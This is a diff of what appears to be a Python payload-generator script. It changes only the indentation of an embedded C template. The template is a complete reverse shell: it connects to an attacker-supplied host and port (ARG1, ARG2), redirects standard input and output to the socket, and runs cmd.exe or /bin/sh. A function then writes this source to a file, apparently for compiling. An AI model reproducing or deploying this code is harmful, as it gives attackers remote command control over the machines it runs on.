@@ -27,36 +27,37 @@ EXEC = ''
 
 pl = '''
 int main() {
-	int sk;
-	struct sockaddr_in sin;
+        int sk;
+        struct sockaddr_in sin;
 
-	memset(&sin, 0, sizeof(sin));
-	sin.sin_family = AF_INET;
-	sin.sin_port   = htons(ARG2);
-	if (1 != inet_pton(AF_INET, "ARG1", &sin.sin_addr)) {
-		perror("inet_pton");
-		return 1;
-	}
+        memset(&sin, 0, sizeof(sin));
+        sin.sin_family = AF_INET;
+        sin.sin_port   = htons(ARG2);
+        if (1 != inet_pton(AF_INET, "ARG1", &sin.sin_addr)) {
+                perror("inet_pton");
+                return 1;
+        }
 
-	if (0 > (sk = socket(AF_INET, SOCK_STREAM, 0))) {
-		perror("socket");
-		return 1;
-	}
+        if (0 > (sk = socket(AF_INET, SOCK_STREAM, 0))) {
+                perror("socket");
+                return 1;
+        }
 
-	if (0 > connect(sk, (struct sockaddr*)&sin, sizeof(sin))) {
-		perror("connect");
-		return 1;
-	}
+        if (0 > connect(sk, (struct sockaddr*)&sin, sizeof(sin))) {
+                perror("connect");
+                return 1;
+        }
 
-	dup2(sk, 0);
-	dup2(sk, 1);
-	dup2(sk, 2);
+        dup2(sk, 0);
+        dup2(sk, 1);
+        dup2(sk, 2);
 
-	execlp("C:\\\\windows\\\\system32\\\\cmd.exe", "cmd", 0);
-	execlp("/bin/sh", "sh", 0);
-	perror("execlp");
+        execlp("C:\\\\windows\\\\system32\\\\cmd.exe", "cmd", 0);
+        execlp("/bin/sh", "sh", 0);
+        perror("execlp");
 }
 '''.strip()
+
 
 def g(s, args, dst, url):
     with open('{}/src.c'.format(dst), 'w') as fp:
